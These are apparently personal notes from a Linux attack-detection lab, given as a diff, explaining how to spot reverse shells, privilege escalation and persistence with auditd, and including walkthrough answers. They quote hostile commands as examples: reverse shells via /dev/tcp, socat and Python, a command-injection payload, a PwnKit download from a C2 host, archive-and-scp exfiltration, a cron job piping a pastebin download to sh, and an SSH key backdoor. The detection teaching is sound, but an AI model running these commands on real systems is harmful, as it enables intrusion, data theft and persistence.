@@ -467,3 +467,260 @@ Which IP address range did the attacker scan for an exposed SSH?
 Answer Example: 10.0.0.1-10.0.0.126.
 
 `:> ausearch -if audit.log -x nc`
+
+## Reverse Shells
+
+Initial access via web vulnerability or exploit provides for buggy command output, execution delays, timeouts, rate limits, network restrictions, et al.  
+
+Reverse shells reduce reduce or eliminate the negative implications of web-based exploits.  
+
+Example reverse shell methods
+
+| Command on the Victim                                                  | Explanation                                                                               |
+| ---------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
+| `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1`                            | The victim is forced to connect to `10.10.10.10:1337` and launch `bash` for the attacker. |
+| `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` | Socat alternative to the above command. The attacker is listening at `10.20.20.20:2525`.  |
+| `python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'`   | Python alternative to the above command. The attacker is listening at `10.30.30.30:80`.   |
+
+### Detecting Reverse Shells
+
+Detectable with auditd
+
+SoCat Log Output:  
+
+```bash
+root@thm-vm:~$ ausearch -i -x socat # Look for suspicious commands like socat
+type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
+type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec
+
+root@thm-vm:~$ ausearch -i --pid 27806 # Find its parent process and build a process tree
+type=PROCTITLE msg=audit(09/19/25 17:42:07.825:404) : proctitle=/bin/sh -c 4 -W 1 127.0.0.1 && socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
+type=SYSCALL msg=audit(09/19/25 17:42:07.825:404) : ppid=27796 pid=27806 auid=unset uid=serviceuser key=exec
+
+root@thm-vm:~$ ausearch -i --pid 27796 # Move up the process tree to confirm its origin - TryPingMe
+type=PROCTITLE msg=audit(09/19/25 17:41:57.252:403) : proctitle=/usr/bin/python3 /opt/trypingme/main.py
+type=SYSCALL msg=audit(09/19/25 17:41:57.252:403) : exe=/usr/bin/python3.12 ppid=1 pid=27796 auid=unset uid=serviceuser key=exec
+```
+
+Using `ausearch` to perform the process tree analysis
+
+```bash
+root@thm-vm:~$ ausearch -i -x socat # Start from the detected reverse shell
+type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
+type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec
+
+root@thm-vm:~$ ausearch -i --ppid 27808 | grep proctitle # List all its child processes
+type=PROCTITLE msg=audit(09/19/25 17:42:12.825:408) : proctitle=id
+type=PROCTITLE msg=audit(09/19/25 17:42:14.371:410) : proctitle=uname -a
+type=PROCTITLE msg=audit(09/19/25 17:42:25.432:412) : proctitle=ls -la .
+```
+
+### Reverse Shell Questions
+
+Run 127.0.0.1 && whoami in the TryPingMe web app.
+What output do you see after the ping results?
+
+Now try spawning a reverse shell to the imaginary "attacker.thm" address.
+Run 127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh in the web app.
+What is the flag returned in the TryPingMe response?
+
+Now look at the exported auditd logs at /home/ubuntu/scenario.
+Which IP spawned a similar reverse shell via the TryPingMe app?
+
+`:> grep -i socat audit.log`  
+
+## Privilege Escalation
+
+Detecting privielge escalation is done by detecting the surrouding events.
+
+```bash
+# Detection 1: A Spike of Discovery Commands
+whoami                                                # Returns "www-data" user
+id; pwd; ls -la; crontab -l                           # Basic initial Discovery
+ps aux | egrep "edr|splunk|elastic"                   # Security tools Discovery
+uname -r                                              # Returns an old 4.4 kernel
+
+# Detection 2: A Download to Temp Directory
+wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download
+gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation
+chmod +x /tmp/pwnkit                                  # Making exploit executable
+/tmp/pwnkit                                           # Trying to use the exploit
+
+# Detection 3: Data Exfiltration With SCP
+whoami                                                # Now returns "root" user
+tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
+scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
+```
+
+Verify privilege escalation by comparing effective user before and after the potential exploit.
+
+```bash
+root@thm-vm:~$ ausearch -i -x pwnkit # The PwnKit was launched by serviceuser (Look at the UID field)
+type=PROCTITLE msg=audit(09/19/25 17:56:12.154:416) : proctitle=/tmp/pwnkit
+type=SYSCALL msg=audit(09/19/25 17:56:12.154:416) : ppid=24302 pid=24304 auid=unset uid=serviceuser key=exec
+
+root@thm-vm:~$ ausearch -i --ppid 24304 # The PwnKit spawned a root shell (Look at the UID field)
+type=PROCTITLE msg=audit(09/19/25 17:56:12.807:418) : proctitle=bash
+type=SYSCALL msg=audit(09/19/25 17:56:12.807:418) : ppid=24304 pid=24310 auid=unset uid=root key=exec
+
+root@thm-vm:~$ ausearch -i --ppid 24310 # The threat actor continues the attack as root user
+type=PROCTITLE msg=audit(09/19/25 17:56:15.225:424) : proctitle=whoami
+type=SYSCALL msg=audit(09/19/25 17:56:15.225:424) : ppid=24310 pid=24312 auid=unset uid=root key=exec
+```
+
+### Privilege Escalation Questions 
+
+Which command line was used to look for the "pass" keyword in files?  
+
+`:> grep -i 'pass' audit.log`  
+
+Which command line was used to escalate privileges to root?  
+
+`:> grep -i 'comm' audit.log`  
+
+Looking at the detected .env file, what was the root password?  
+
+`:> grep -in -B 4 ".env" audit.log`
+
+Find the file path in the value of the `cwd` and follow it.  
+
+## Startup Persistence
+
+Linux servers can run for years without human contact or reboot, unless somethign breaks; strong targets for persistence
+
+### Cron Persistence
+
+Simplets method for recurrring execution of a task  
+
+[GoldMax](https://www.crowdstrike.com/en-us/blog/observations-from-the-stellarparticle-campaign/#:~:text=a%20crontab%20entry%20was%20created%20with%20a) Case Report  
+
+```bash
+# A line added by APT29 to /var/spool/cron/<user> to run malware on boot
+@reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &
+```
+
+[Rocke cryptominer](https://redcanary.com/blog/threat-detection/rocke-cryptominer/#:~:text=Rocke%20takes%20advantage%20of%20this%20to%20modify%20crontabs) case study
+
+```bash
+# A simplified command that adds the cron job to /etc/cron.d/root
+echo "*/10 * * * root (curl https://pastebin.com/raw/1NtRkBc3) | sh" > /etc/cron.d/root
+```
+
+### Systemd Persistence
+
+Systemd services host the most critical systme components  
+stored at `/lib/systmd/system` or `/etc/systemd/system`  
+
+Gaining root privileges allows attacker to create own services.  
+
+[GOGETTER](https://cloud.google.com/blog/topics/threat-intelligence/sandworm-disrupts-power-ukraine-operational-technology/) emplyed Systemd service unilts designed to masquerade as legitimate service.  
+
+### Detecting Persistence
+
+cron jobs and systemd services are defined as text files.  
+moniotr text files for changes using auditd.  
+
+| Monitoring Focus                   | Details                                                                     |  
+| ---------------------------------- | --------------------------------------------------------------------------- |  
+| Monitor changes in cron job files  | `/etc/crontab`, `/etc/cron.d*`, `/var/spool/cron/*`, `/var/spool/crontab/*` |  
+| Monitor changes in systemd folders | `/lib/systemd/system/*`, `/etc/systemd/system/*`, and less common locations |  
+| Monitor related processes such as  | `nano /etc/crontab`, `crontab -e`, `systemctl start \| enable <service>`    |
+
+Detection with auditd  
+
+```bash
+root@thm-vm:~$ ausearch -i -f /etc/systemd # Look for file changes inside /etc/systemd
+type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=vi /etc/systemd/system/malicious.service
+type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/etc/systemd/system/malicious.service
+type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/
+type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd
+
+root@thm-vm:~$ ausearch -i -x crontab # Look for execution of crontab command
+type=PROCTITLE msg=audit(09/22/25 17:25:14.933:807) : proctitle=crontab -e
+type=SYSCALL msg=audit(09/22/25 17:25:14.933:807) : syscall=execve [...] ppid=1265 pid=1316 uid=root key=exec
+```
+
+### Persistence Questions
+
+What flag did you get after running the malware persisting as a service?  
+
+`:> sudo ausearch -i -x nano > outfile`  
+`:> less outfile`  
+The manipulated service is immediately obvious 
+`:> sudo cat -n /etc/systemd/system/tux.service`  
+the location of the binary is immediately obvious  
+`:> cd /var/lib/misc`
+`:> ./tux`  
+You have already seen the answer...
+
+What flag did you get after running the malware persisting as a cron job?  
+
+`:> sudo crontab -l`  
+ 
+ contents of the file point to `/usr/sbin/phoenix`  
+
+User-specific crontabs are typically found in `/var/spool/cron/crontabs`  
+
+`:> ./phoenix`
+
+
+
+## Account Persistence
+
+### New User Accounts
+
+Creation of new user account and addition of the new account to a privileged group.  
+User creation events are tracked through authentication logs and processt tree analysis.  
+
+```bash
+root@thm-vm:~$ cat /var/log/auth.log | grep -E 'useradd|usermod'
+2025-09-18T15:46:30 thm-vm useradd[27254]: new group: name=support, GID=1001
+2025-09-18T15:46:30 thm-vm useradd[27254]: new user: name=support, UID=1001, GID=1001, home=/home/support, shell=/bin/bash
+2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to group 'sudo'
+2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to shadow group 'sudo'
+```
+
+### Backdoor SSH Keys
+
+Difficult to spot  
+Adds the key of a compromised user toe the authroized_keys file  
+
+```bash
+# Adding SSH backdoor to the authorized_keys
+root@thm-vm:~$ echo "AAAAC3Nza...IkiINvQt/R" >> ~/.ssh/authorized_keys
+
+# It's hard to guess which key is a backdoor!
+root@thm-vm:~$ cat ~/.ssh/authorized_keys
+ssh-ed25519 AAAAC3Nza...oh5fpNy1Gi # Legitimate key
+ssh-ed25519 AAAAC3Nza...N9a2UYsFpQ # Legitimate key
+ssh-ed25519 AAAAC3Nza...IkiINvQt/R # Backdoor key
+```
+
+authorized public keys are stored in each user's `~/.ssh/authorized_keys`  
+Detection is through moniotring changes to the file..  
+
+```bash
+# Traces of a backdoor created with "echo [key] >> ~/.ssh/authorized_keys"
+# Note how the malicious "echo" command is logged simply as "bash"
+root@thm-vm:~$ ausearch -i -f /.ssh/authorized_keys
+type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=bash
+type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/home/user/.ssh/authorized_keys
+type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/
+type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd
+```
+
+### Application Persistence
+
+Attackers gaining entry into a web admin can intall a backdoor and run commands through the backdoor.  
+cronjob / ssh keys not required  
+not recorded by system logs or auditd  
+
+### Account Persistence Questions
+
+Which user was created and added to the sudo group?
+
+`:> grep -E 'useradd|usermod' /var/log/auth.log`  
+
+Which file was changed to allow SSH key persistence?  
+
+super obvious.
